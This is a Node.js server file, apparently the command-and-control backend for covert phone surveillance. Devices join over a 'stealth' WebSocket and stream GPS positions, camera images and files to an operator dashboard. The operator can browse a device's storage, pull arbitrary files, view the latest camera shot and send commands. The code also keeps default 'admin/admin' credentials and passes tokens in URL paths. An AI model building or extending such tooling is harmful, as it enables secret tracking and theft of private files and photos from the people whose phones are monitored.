import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { createClient } from "@supabase/supabase-js";
import { WebSocketServer, WebSocket } from "ws";
import http from "http";

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", 1);

const deviceCommands = new Map();
const stealthConnections = new Map();
const webClients = new Set();
const deviceFileCache = new Map();
const fileChunkBuffers = new Map();
const completedFileIds = new Map();
// ИСПРАВЛЕНО: long-poll ожидание скачивания файла
// Когда фронтенд запрашивает файл — HTTP запрос висит здесь до сборки чанков
const pendingFileDownloads = new Map(); // reqId -> { res, timeoutId, deviceId, filePath }

console.log("Starting location tracker server...");

const server = http.createServer(app);

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";

if (!supabaseUrl || !supabaseKey) {
  console.error("FATAL: Missing SUPABASE_URL or SUPABASE_ANON_KEY env variables");
  process.exit(1);
}

if (process.env.NODE_ENV === "production") {
  if (!process.env.SECRET_TOKEN || SECRET_TOKEN === "your_secret_key_123") {
    console.error("FATAL: SECRET_TOKEN not set or using default in production. Refusing to start.");
    process.exit(1);
  }
  if (!process.env.ADMIN_USER || !process.env.ADMIN_PASS || (ADMIN_USER === "admin" && ADMIN_PASS === "admin")) {
    console.error("FATAL: Using default admin credentials in production. Refusing to start.");
    process.exit(1);
  }
}

const supabase = createClient(supabaseUrl, supabaseKey);

app.use(helmet({ contentSecurityPolicy: false }));

const allowedOrigins = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(",") : null;
app.use(cors(allowedOrigins ? {
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
    else callback(new Error("Not allowed by CORS"));
  }
} : {}));

app.use(bodyParser.json({ limit: "50mb" }));

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 300,
  message: { error: "Too many requests, please try again later" }
});
app.use("/api/", apiLimiter);

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 10,
  message: { error: "Too many login attempts, try again later" }
});

app.use(express.static("public"));

const wss = new WebSocketServer({ noServer: true, maxPayload: 50 * 1024 * 1024 });

server.on("upgrade", (request, socket, head) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);
    const pathname = url.pathname || "";
    if (pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth")) {
      wss.handleUpgrade(request, socket, head, (ws) => { wss.emit("connection", ws, request); });
    } else { socket.destroy(); }
  } catch (err) { socket.destroy(); }
});

function broadcastToWebClients(obj) {
  const payload = JSON.stringify(obj);
  for (const client of webClients) {
    try {
      if (client.readyState === WebSocket.OPEN) client.send(payload);
      else webClients.delete(client);
    } catch (e) { console.error("Error sending to web client:", e); webClients.delete(client); }
  }
}

function isWsOpen(ws) { return ws && ws.readyState === WebSocket.OPEN; }

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;
  const deviceId = url.searchParams.get("deviceId");

  if (pathname.startsWith("/ws/live")) {
    webClients.add(ws);
    console.log(`🌐 Web client connected. Total: ${webClients.size}`);
    ws.on("close", () => { webClients.delete(ws); console.log(`🌐 Web client disconnected. Total: ${webClients.size}`); });
    ws.on("error", (err) => { console.error("Web client error:", err); });
    return;
  }

  if (deviceId && pathname.startsWith("/ws/stealth")) {
    const wsToken = url.searchParams.get("token") || req.headers["authorization"];
    if (wsToken !== SECRET_TOKEN) {
      console.log(`🚫 Unauthorized WebSocket connection attempt for device ${deviceId}`);
      try { ws.close(1008, "Unauthorized"); } catch (e) {}
      return;
    }

    ws.deviceId = deviceId;

    const existing = stealthConnections.get(deviceId);
    if (existing && existing.ws !== ws) {
      if (isWsOpen(existing.ws)) {
        const timeSinceLastPing = Date.now() - (existing.lastSeen || 0);
        const appPingRecent = timeSinceLastPing < 15000;
        const wsAlive = existing.ws.isAlive !== false;
        if (appPingRecent && wsAlive) {
          console.log(`⚠️ Device ${deviceId} trying to connect, but has active connection. Rejecting new.`);
          try { ws.close(1000, 'Already connected'); } catch (e) {}
          return;
        } else {
          console.log(`🔄 Replacing stale connection for device ${deviceId} (appPingRecent=${appPingRecent}, wsAlive=${wsAlive})`);
          try { existing.ws.terminate(); } catch (e) {}
        }
      }
    }

    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
    console.log(`📱 Device ${deviceId} connected`);

    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    const heartbeat = setInterval(() => {
      const info = stealthConnections.get(deviceId);
      if (!info || info.ws !== ws) { clearInterval(heartbeat); return; }
      if (!isWsOpen(ws)) { clearInterval(heartbeat); return; }
      if (!ws.isAlive) {
        console.log(`💀 Device ${deviceId} heartbeat timeout, terminating stale socket`);
        ws.terminate(); clearInterval(heartbeat); return;
      }
      ws.isAlive = false;
      try { ws.ping(); } catch (e) {}
      const deltaSec = Math.floor((Date.now() - (info.lastSeen || 0)) / 1000);
      console.log(`⏳ ${deviceId} last app-ping ${deltaSec}s ago (socket OPEN)`);
    }, 30000);

    ws.on("message", (rawData) => {
      try {
        const msg = JSON.parse(rawData.toString());
        const deviceInfo = stealthConnections.get(deviceId);
        if (deviceInfo) deviceInfo.lastSeen = Date.now();

        if (msg.type === "ping") {
          console.log(`💓 Ping from ${deviceId}`);
          try { if (isWsOpen(ws)) ws.send(JSON.stringify({ type: "pong", timestamp: Date.now() })); }
          catch (e) { console.error("Error sending pong:", e); }
          return;
        }

        if (msg.type === "location") {
          if (!validateGPSPoint(msg.latitude, msg.longitude, msg.accuracy)) {
            console.log(`⚠️ Invalid GPS data from ${deviceId}: ${msg.latitude}, ${msg.longitude}`);
            return;
          }
          console.log(`📍 Location from ${deviceId}: ${msg.latitude}, ${msg.longitude}`);
          (async () => {
            try {
              const { error } = await supabase.from("locations").insert([{
                device_id: msg.device_id || deviceId,
                device_name: msg.device_name || "Unknown Device",
                latitude: parseFloat(msg.latitude), longitude: parseFloat(msg.longitude),
                timestamp: msg.timestamp || Date.now(),
                accuracy: msg.accuracy ? parseFloat(msg.accuracy) : null,
                battery: msg.battery != null ? parseInt(msg.battery) : null,
                wifi_info: null
              }]);
              if (error) console.error("❌ Error saving location:", error);
              else console.log(`   ✅ Location saved to database`);
            } catch (err) { console.error("❌ Database error:", err); }
          })();
          try { if (isWsOpen(ws)) ws.send(JSON.stringify({ type: 'location_ack', timestamp: Date.now() })); }
          catch (e) { console.error("Error sending location ack:", e); }
          broadcastToWebClients({
            type: "location", deviceId,
            data: { latitude: parseFloat(msg.latitude), longitude: parseFloat(msg.longitude), accuracy: msg.accuracy, battery: msg.battery },
            timestamp: msg.timestamp || Date.now()
          });
          return;
        }

        // ─── Сборка чанков файла ───────────────────────────────────────
        if (msg.type === "file_chunk") {
          const { file_id, filename, chunk_index, total_chunks, data, total_size } = msg;

          if (!file_id || typeof file_id !== "string" ||
              typeof chunk_index !== "number" || typeof total_chunks !== "number" ||
              total_chunks < 1 || total_chunks > 10000 ||
              chunk_index < 0 || chunk_index >= total_chunks ||
              typeof data !== "string") {
            console.warn(`⚠️ Invalid file_chunk params from ${deviceId}: chunk=${chunk_index}/${total_chunks}`);
            return;
          }

          if (completedFileIds.has(file_id)) {
            try { if (isWsOpen(ws)) ws.send(JSON.stringify({ type: 'file_received', file_id, filename })); } catch (e) {}
            return;
          }

          if (!fileChunkBuffers.has(file_id)) {
            fileChunkBuffers.set(file_id, {
              filename, total_chunks, total_size,
              chunks: new Array(total_chunks).fill(null),
              received: 0, deviceId, startedAt: Date.now()
            });
          }

          const transfer = fileChunkBuffers.get(file_id);
          if (transfer.chunks[chunk_index] === null) {
            transfer.chunks[chunk_index] = data;
            transfer.received++;
          }

          broadcastToWebClients({
            type: "file_chunk_progress", deviceId, file_id, filename,
            received: transfer.received, total: total_chunks
          });

          if (transfer.received === total_chunks) {
            let fullData;
            try {
              // Каждый чанк — чистый base64 (Android больше не использует GZIP для файлов)
              const buffers = transfer.chunks.map(chunk => Buffer.from(chunk, 'base64'));
              fullData = Buffer.concat(buffers).toString('base64');
            } catch (e) {
              console.error(`❌ Error assembling file ${filename}:`, e);
              fileChunkBuffers.delete(file_id);
              return;
            }

            console.log(`📥 File assembled: ${filename} from ${deviceId} (${total_size} bytes, ${total_chunks} chunks)`);

            try { if (isWsOpen(ws)) ws.send(JSON.stringify({ type: 'file_received', file_id, filename })); }
            catch (e) { console.error("Error sending file_received ack:", e); }

            completedFileIds.set(file_id, Date.now());
            fileChunkBuffers.delete(file_id);

            // ИСПРАВЛЕНО: отвечаем на ожидающий long-poll HTTP запрос напрямую
            // Это устраняет 30-секундный таймаут фронтенда
            let resolvedByLongPoll = false;
            for (const [reqId, pending] of pendingFileDownloads) {
              if (pending.deviceId === deviceId) {
                clearTimeout(pending.timeoutId);
                pendingFileDownloads.delete(reqId);
                if (!pending.res.headersSent) {
                  pending.res.json({ success: true, filename, data: fullData, size: total_size });
                  console.log(`✅ File delivered via long-poll to browser: ${filename} (${Math.round(total_size/1024)}KB)`);
                }
                resolvedByLongPoll = true;
                break;
              }
            }

            // Fallback: broadcast через WebSocket если нет ожидающего HTTP запроса
            // Ограничение 10MB только для WebSocket broadcast (large files через long-poll)
            if (!resolvedByLongPoll) {
              if (fullData.length <= 10 * 1024 * 1024) {
                broadcastToWebClients({ type: "file_download", deviceId, filename, data: fullData, size: total_size, timestamp: Date.now() });
              } else {
                console.warn(`⚠️ File too large for WebSocket broadcast and no pending HTTP request: ${filename}`);
              }
            }
          }
          return;
        }

        if (msg.type === "file_list") {
          deviceFileCache.set(deviceId, { data: msg.data, timestamp: Date.now() });
          const totalFiles = (msg.data && msg.data.total) || 0;
          console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
          const callback = fileRequestCallbacks.get(deviceId);
          if (callback) callback();
          return;
        }

        if (msg.type === "file_download") {
          const dataSize = msg.data ? msg.data.length : 0;
          console.log(`📥 Received file: ${msg.filename} from ${deviceId} (${dataSize} bytes)`);
          if (dataSize > 10 * 1024 * 1024) { console.warn(`File too large for broadcast: ${dataSize} bytes`); return; }
          broadcastToWebClients({ type: "file_download", deviceId, filename: msg.filename, data: msg.data, size: msg.size, timestamp: msg.timestamp || Date.now() });
          return;
        }

        if (msg.type === "image") {
          const info = stealthConnections.get(deviceId);
          if (info) {
            const imgSize = msg.data ? msg.data.length : 0;
            if (imgSize <= 5 * 1024 * 1024) { info.latestImage = msg.data; info.latestImageTime = Date.now(); }
            else console.warn(`Image from ${deviceId} too large: ${imgSize} bytes, skipping cache`);
          }
        }

        broadcastToWebClients({ type: msg.type, deviceId, data: msg.data, timestamp: msg.timestamp || Date.now() });

      } catch (err) { console.error(`Error from device ${deviceId}:`, err); }
    });

    ws.on("close", () => {
      clearInterval(heartbeat);
      const current = stealthConnections.get(deviceId);
      if (current && current.ws === ws) {
        stealthConnections.delete(deviceId);
        deviceFileCache.delete(deviceId);
        console.log(`📱 Device ${deviceId} disconnected`);
      }
    });

    ws.on("error", (err) => {
      clearInterval(heartbeat);
      const current = stealthConnections.get(deviceId);
      if (current && current.ws === ws) { stealthConnections.delete(deviceId); deviceFileCache.delete(deviceId); }
      console.error(`⚠️ Device error (${deviceId}):`, err);
    });

    return;
  }

  try { ws.close(); } catch (e) {}
});

// --- API routes ---

app.post("/api/login", loginLimiter, (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) return res.json({ success: true, token: SECRET_TOKEN });
  return res.status(401).json({ success: false, error: "Invalid credentials" });
});

const fileRequestCallbacks = new Map();

app.get('/api/device/:deviceId/files/:token', (req, res) => {
  const { deviceId, token } = req.params;
  const emptyResponse = { categories: { images: [], videos: [], audio: [], documents: [], archives: [] }, total: 0 };
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: 'Forbidden' });

  const cached = deviceFileCache.get(deviceId);
  if (cached && (Date.now() - cached.timestamp < 10000)) return res.json(cached.data);

  const device = stealthConnections.get(deviceId);
  if (!device || !isWsOpen(device.ws)) return res.json(emptyResponse);

  try { device.ws.send(JSON.stringify({ action: 'get_files' })); }
  catch (e) { console.error("Error requesting files:", e); return res.json(emptyResponse); }

  const timeoutId = setTimeout(() => {
    fileRequestCallbacks.delete(deviceId);
    const updated = deviceFileCache.get(deviceId);
    if (!res.headersSent) res.json(updated ? updated.data : emptyResponse);
  }, 8000);

  fileRequestCallbacks.set(deviceId, () => {
    clearTimeout(timeoutId);
    fileRequestCallbacks.delete(deviceId);
    const updated = deviceFileCache.get(deviceId);
    if (!res.headersSent) res.json(updated ? updated.data : emptyResponse);
  });
});

app.get("/api/analytics/:deviceId/:token", async (req, res) => {
  const { deviceId, token } = req.params;
  const days = Math.min(Math.max(parseInt(req.query.days) || 7, 1), 365);
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  try {
    const cutoff = Date.now() - (days * 24 * 60 * 60 * 1000);
    const { data, error } = await supabase.from("locations").select("*").eq("device_id", deviceId).gte("timestamp", cutoff).order("timestamp", { ascending: true });
    if (error) throw error;
    let totalDistance = 0;
    for (let i = 1; i < data.length; i++) {
      const prev = data[i-1], curr = data[i];
      totalDistance += getDistance(parseFloat(prev.latitude), parseFloat(prev.longitude), parseFloat(curr.latitude), parseFloat(curr.longitude));
    }
    return res.json({ total_distance: totalDistance / 1000, total_points: data.length, locations: data });
  } catch (err) { return res.status(500).json({ error: "Database error" }); }
});

app.get("/api/devices/:token", async (req, res) => {
  const { token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  try {
    const { data, error } = await supabase.from("locations")
      .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
      .order("timestamp", { ascending: false }).limit(10000);
    if (error) throw error;
    const devices = {};
    const now = Date.now();
    data.forEach((location) => {
      if (!devices[location.device_id]) {
        devices[location.device_id] = {
          device_id: location.device_id, device_name: location.device_name,
          last_seen: location.timestamp, battery: location.battery,
          location_count: 0, last_location: { lat: location.latitude, lng: location.longitude }
        };
      }
      devices[location.device_id].location_count++;
    });
    Object.keys(devices).forEach(deviceId => {
      const info = stealthConnections.get(deviceId);
      const isConnected = !!(info && isWsOpen(info.ws));
      const lastPing = info ? info.lastSeen : 0;
      const timeSinceLastPing = now - lastPing;
      devices[deviceId].is_connected = isConnected && (timeSinceLastPing < 30000);
      if (info) { devices[deviceId].server_lastSeen = lastPing; devices[deviceId].last_ping_seconds_ago = Math.floor(timeSinceLastPing / 1000); }
    });
    return res.json(Object.values(devices));
  } catch (err) { console.error("Error in /api/devices:", err); return res.status(500).json({ error: "Database error" }); }
});

app.post("/api/device/command", (req, res) => {
  const { device_id, command, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  if (!device_id || typeof device_id !== "string" || device_id.length > 200) return res.status(400).json({ error: "Invalid device_id" });
  if (!command || typeof command !== "string") return res.status(400).json({ error: "Invalid command" });
  deviceCommands.set(device_id, { action: command.toLowerCase(), timestamp: Date.now() });
  const entry = stealthConnections.get(device_id);
  if (entry && isWsOpen(entry.ws)) {
    try {
      entry.ws.send(JSON.stringify({ action: command.toLowerCase(), timestamp: Date.now() }));
      return res.json({ success: true, delivered: true });
    } catch (e) { console.error("Error sending command to device:", e); return res.json({ success: false, delivered: false, error: "Failed to send to device" }); }
  }
  return res.json({ success: true, delivered: false, reason: "Device offline, command queued" });
});

app.post("/api/device/file-command", (req, res) => {
  const { device_id, command, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  if (!device_id || typeof device_id !== "string" || device_id.length > 200) return res.status(400).json({ error: "Invalid device_id" });
  const entry = stealthConnections.get(device_id);
  if (!entry || !isWsOpen(entry.ws)) return res.status(404).json({ success: false, error: "Device offline" });
  try {
    let parsedCommand;
    try { parsedCommand = typeof command === "string" ? JSON.parse(command) : command; }
    catch (e) { return res.status(400).json({ error: "Invalid command format" }); }
    entry.ws.send(JSON.stringify({ action: "file_command", command: parsedCommand, timestamp: Date.now() }));
    return res.json({ success: true, delivered: true });
  } catch (e) { console.error("Error sending file command:", e); return res.status(500).json({ success: false, error: "Failed to send command" }); }
});

// ИСПРАВЛЕНО: long-poll вместо fire-and-forget
// HTTP запрос остаётся открытым (до 120 сек) пока Android не пришлёт все чанки файла.
// Это устраняет "File loading timeout" в браузере — теперь браузер просто ждёт ответа.
app.post("/api/device/download-file", (req, res) => {
  const { device_id, file_path, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  const entry = stealthConnections.get(device_id);
  if (!entry || !isWsOpen(entry.ws)) return res.status(404).json({ error: "Device offline" });

  const reqId = `${device_id}-${Date.now()}`;

  try {
    entry.ws.send(JSON.stringify({ action: "download_file", file_path, timestamp: Date.now() }));
    console.log(`📤 File download requested: ${file_path} from ${device_id}`);
  } catch (e) {
    console.error("Error sending download request:", e);
    return res.status(500).json({ error: "Failed to send request to device" });
  }

  const timeoutId = setTimeout(() => {
    pendingFileDownloads.delete(reqId);
    if (!res.headersSent) {
      console.warn(`⏰ File download timeout for: ${file_path}`);
      res.status(408).json({ error: "File transfer timeout. File may be too large or device is slow. Try again." });
    }
  }, 120000); // 120 секунд

  pendingFileDownloads.set(reqId, { res, timeoutId, deviceId: device_id, filePath: file_path });
});

app.post("/api/camera/image", (req, res) => {
  const token = req.headers.authorization;
  if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
  const { type, device_id, data, timestamp } = req.body;
  const deviceInfo = stealthConnections.get(device_id);
  if (deviceInfo && type === 'image') { deviceInfo.latestImage = data; deviceInfo.latestImageTime = Date.now(); }
  broadcastToWebClients({ type: "image", deviceId: device_id, data, timestamp: timestamp || Date.now() });
  return res.json({ success: true });
});

app.delete("/api/device/:device_id/:token", async (req, res) => {
  const { device_id, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  try {
    const { error } = await supabase.from("locations").delete().eq("device_id", device_id);
    if (error) throw error;
    return res.json({ success: true });
  } catch (err) { console.error("Error deleting device:", err); return res.status(500).json({ error: "Failed to delete device data" }); }
});

app.post("/api/device/:device_id/rename/:token", async (req, res) => {
  const { device_id, token } = req.params;
  const { name } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  try {
    const { error } = await supabase.from("locations").update({ device_name: name }).eq("device_id", device_id);
    if (error) throw error;
    return res.json({ success: true });
  } catch (err) { console.error("Error renaming device:", err); return res.status(500).json({ error: "Failed to rename device" }); }
});

app.post("/api/location", async (req, res) => {
  const receivedToken = req.headers.authorization;
  if (receivedToken !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
  const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;
  if (!validateGPSPoint(latitude, longitude, accuracy)) return res.status(400).json({ error: "Invalid GPS coordinates" });
  let timestampValue = typeof timestamp === "string" ? new Date(timestamp).getTime() : timestamp;
  try {
    const { error } = await supabase.from("locations").insert([{
      device_id, device_name,
      latitude: parseFloat(latitude), longitude: parseFloat(longitude),
      timestamp: timestampValue, accuracy: parseFloat(accuracy),
      battery: battery != null ? parseInt(battery) : null,
      wifi_info: wifi_info || null
    }]);
    if (error) throw error;
    broadcastToWebClients({
      type: "location", deviceId: device_id,
      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery },
      timestamp: timestampValue || Date.now()
    });
    return res.json({ success: true });
  } catch (err) { console.error("Location save error:", err); return res.status(500).json({ error: "Server error" }); }
});

app.get("/api/device/:deviceId/:token", async (req, res) => {
  const { deviceId, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
  const limit = Math.min(Math.max(parseInt(req.query.limit) || 1000, 1), 5000);
  const offset = Math.max(parseInt(req.query.offset) || 0, 0);
  try {
    const { data, error } = await supabase.from("locations").select("*").eq("device_id", deviceId)
      .order("timestamp", { ascending: true }).range(offset, offset + limit - 1);
    if (error) throw error;
    const filteredLocations = filterDuplicatePoints(data.filter((loc) => validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy)));
    return res.json({
      device_id: deviceId, device_name: data[0]?.device_name || "Unknown Device",
      locations: filteredLocations, total_points: data.length,
      is_connected: !!(stealthConnections.get(deviceId) && isWsOpen(stealthConnections.get(deviceId).ws))
    });
  } catch (err) { return res.status(500).json({ error: "Database error" }); }
});

app.get('/api/device/:deviceId/latest-image/:token', (req, res) => {
  const { deviceId, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: 'Forbidden' });
  const deviceInfo = stealthConnections.get(deviceId);
  if (deviceInfo && deviceInfo.latestImage) {
    res.json({ success: true, image: deviceInfo.latestImage, timestamp: deviceInfo.latestImageTime });
  } else {
    res.json({ success: false, message: 'No image available' });
  }
});

app.get("/", (req, res) => { res.sendFile("index.html", { root: "public" }); });

function validateGPSPoint(lat, lng, accuracy) {
  if (lat === undefined || lng === undefined) return false;
  const nLat = parseFloat(lat), nLng = parseFloat(lng);
  if (Number.isNaN(nLat) || Number.isNaN(nLng)) return false;
  if (nLat < -90 || nLat > 90 || nLng < -180 || nLng > 180) return false;
  if (accuracy !== undefined && accuracy !== null) {
    const acc = parseFloat(accuracy);
    if (!Number.isNaN(acc) && acc > 500) return false;
  }
  return true;
}

function filterDuplicatePoints(locations, minDistance = 10) {
  if (!locations || locations.length < 2) return locations;
  const filtered = [locations[0]];
  for (let i = 1; i < locations.length; i++) {
    const prev = filtered[filtered.length - 1], curr = locations[i];
    const distance = getDistance(parseFloat(prev.latitude), parseFloat(prev.longitude), parseFloat(curr.latitude), parseFloat(curr.longitude));
    const effectiveDistance = distance - (prev.accuracy || 0) - (curr.accuracy || 0);
    if (effectiveDistance > minDistance) filtered.push(curr);
  }
  return filtered;
}

function getDistance(lat1, lon1, lat2, lon2) {
  const R = 6371e3;
  const φ1 = lat1 * Math.PI / 180, φ2 = lat2 * Math.PI / 180;
  const Δφ = (lat2 - lat1) * Math.PI / 180, Δλ = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(Δφ/2)**2 + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2)**2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
}

setInterval(() => {
  const now = Date.now();
  for (const [deviceId, cmd] of deviceCommands) { if (now - cmd.timestamp > 5*60*1000) deviceCommands.delete(deviceId); }
  for (const [deviceId, cache] of deviceFileCache) { if (now - cache.timestamp > 60*1000) deviceFileCache.delete(deviceId); }
  for (const [file_id, transfer] of fileChunkBuffers) {
    if (now - transfer.startedAt > 10*60*1000) {
      console.warn(`🗑️ Dropping stale incomplete transfer: ${transfer.filename} (${transfer.received}/${transfer.total_chunks} chunks)`);
      fileChunkBuffers.delete(file_id);
    }
  }
  for (const [file_id, completedAt] of completedFileIds) { if (now - completedAt > 5*60*1000) completedFileIds.delete(file_id); }
  for (const [reqId, pending] of pendingFileDownloads) {
    const ts = parseInt(reqId.split('-').pop());
    if (now - ts > 130*1000) pendingFileDownloads.delete(reqId);
  }
}, 5 * 60 * 1000);

if (ADMIN_USER === "admin" && ADMIN_PASS === "admin") {
  console.warn("⚠️ WARNING: Using default admin credentials. Set ADMIN_USER and ADMIN_PASS environment variables.");
}
if (SECRET_TOKEN === "your_secret_key_123") {
  console.warn("⚠️ WARNING: Using default secret token. Set SECRET_TOKEN environment variable.");
}

server.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });
